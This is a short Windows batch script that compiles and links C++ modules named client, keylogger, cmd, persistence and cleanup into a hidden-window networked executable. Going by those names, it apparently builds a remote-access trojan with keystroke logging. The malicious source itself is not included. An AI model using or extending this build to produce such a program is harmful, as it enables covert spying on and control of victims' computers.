@echo off
echo Compiling your program...

g++ -c client.cpp 
g++ -c keylogger.cpp
g++ -c cmd.cpp
g++ -c persistence.cpp
g++ -c cleanup.cpp

echo Linking...
g++ -o client.exe client.o cmd.o keylogger.o persistence.o cleanup.o -lws2_32 -mwindows

echo Done.
